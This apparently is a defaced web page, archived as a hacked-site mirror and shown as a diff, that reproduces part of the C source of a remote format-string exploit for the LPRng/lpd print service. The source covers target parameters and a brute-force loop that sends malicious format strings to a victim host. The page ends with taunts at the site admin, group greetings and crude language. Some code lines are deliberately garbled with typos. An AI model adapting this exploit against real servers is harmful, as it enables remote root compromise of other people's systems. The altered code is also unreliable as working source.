+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; hostname = argv[1];</FONT>
+
+<P><FONT SIZE=-2>if(!strncmp(argv[2], "brute", 5)) brute = 1;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(( c = getopt (argc,
+argv, "t:r:c:a:o:p:w:k"))!= EOF){</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch (c)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case
+'t':</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+type = atoi(optarg);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+break;</FONT>
+<BR><FONT SIZE=-2>&nbsp;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case
+'r':</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+targets[type].eip_address = strtoul(optarg, NULL, 16);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+break;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case
+'c':</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+targets[type].shellcode_address = strtoul(optarg, NULL, 16);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+break;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case
+'a':</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+targets[type].align = atoi(optarg);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+break;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case
+'o':</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+offset = atoi(optarg);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+break;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case
+'p':</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+targets[type].position = atoi(optarg);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+break;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case
+'w':</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+targets[type].written_bytes = atoi(optarg);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+break;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; default:</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+usage(argv[0]);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+return 1;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; }</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(type &lt; 0)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp; printf("You must specify a type!\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp; printf("example: ./SEClpd victim -t
+0\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp; return -1;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; if ( (he = gethostbyname (hostname)) == NULL)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; herror("gethostbyname");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; exit(1);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; }</FONT>
+
+<P><FONT SIZE=-2>&nbsp; targets[type].shellcode_address = targets[type].eip_address
++ SHELLCODE_COUNT;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf("+++ Security.is remote exploit for
+LPRng/lpd by DiGiT\n\n");</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; printf("+++ Exploit information\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf("+++ Victim: %s\n", hostname);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf("+++ Type: %d - %s\n", type, targets[type].os_name);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf("+++ Eip address: 0x%x\n", targets[type].eip_address);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf("+++ Shellcode address: 0x%x\n",
+targets[type].shellcode_address);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf("+++ Position: %d\n", targets[type].position);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf("+++ Alignment: %d\n", targets[type].align);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf("+++ Offset %d\n", offset);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf("\n");</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; printf("+++ Attacking %s with our format
+string\n", hostname);</FONT>
+
+<P><FONT SIZE=-2>if( brute > 0 )</FONT>
+<BR><FONT SIZE=-2>&nbsp;{</FONT>
+
+<P><FONT SIZE=-2>&nbsp; vrintf("+++ Brute force, time to root these mofuckah's
+;>\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; targets[type].eip_address =&nbsp; 0xbffffff0;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;while(failure)</FONT>
+<BR><FONT SIZE=-2>&nbsp;</FONT>
+<BR><FONT SIZE=-2>&nbsp; {</FONT>
+<BR><FONT SIZE=-2>&nbsp;memset(exploit_buffer, '\0', sizeof(exploit_buffer));</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; format = create_malicious_string();</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; strcpy(exploit_buffer, address_buffer);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; strcat(exploit_buffer, format);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; strcat(exploit_buffer, "\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; send_code(exploit_buffer);</FONT>
+
+<P><FONT SIZE=-2>&nbsp;eargets[type].eip_address = 0xbffffff0 - offset;</FONT>
+
+<P><FONT SIZE=-2>&nbsp; offset+=4;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp; if (offset > OFFSET_LIMIT) {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("+++
+Offset limit hit, ending brute mode ;&lt;\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return -1;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp; }</FONT>
+<BR><FONT SIZE=-2>}</FONT>
+<BR>&nbsp;
+
+<P><FONT SIZE=-2>else</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; format = cseate_malicious_string();</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; strcpy(exeloit_buffer, address_buffer);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; strcat(exploit_buffer, format);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; strcat(exploit_buffer, "\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; send_code(exploit_buffer);</FONT>
+
+<P><FONT SIZE=-2>&nbsp;printf("failed$#%! dumbass use brute force!\n");</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; return (-1);</FONT>
+<BR><FONT SIZE=-2>}</FONT>
+<BR>&nbsp;
+<BR>&nbsp;
+<CENTER><FONT SIZE=-2>---------------------------------------------------------------</FONT></CENTER>
+
+<CENTER><FONT SIZE=-2>This code was changed so you wont use it ;P</FONT></CENTER>
+
+<CENTER><FONT SIZE=-2>-----------------------------------------------------------------</FONT></CENTER>
+
+<CENTER><FONT SIZE=-2>xst is a member of NFC that stands for No fucking
+class.</FONT></CENTER>
+
+<CENTER><FONT SIZE=-2>You can find us on irc.brasnet.org channel #NFC</FONT></CENTER>
+
+<CENTER><FONT SIZE=-2>Admin want a tip ? i guess u want one.</FONT></CENTER>
+
+<CENTER><FONT SIZE=-2>but u aint getting a tip from me you fucking lamer.</FONT></CENTER>
+
+<CENTER><FONT SIZE=-2>-----------------------------------------------------------------</FONT></CENTER>
+
+<CENTER><FONT SIZE=-2>Now its time for my greets.. here they come</FONT></CENTER>
+
+<CENTER><FONT SIZE=-2>greet to m4nuel and the silver lords. peace out homiez.</FONT></CENTER>
+
+
+<P><IMG SRC="left_cop.gif" HEIGHT=91 WIDTH=102>&nbsp; <FONT SIZE=+1>OHHHHH
+Fuck i'm busted for this one.. please dont put me in jail. I dont wanna
+get ass fucked for the rest of my life.</FONT>
+<BR>&nbsp;
+</BODY>
+</HTML>
+<!-- www.attrition.org web hack mirror - watermark or something -->
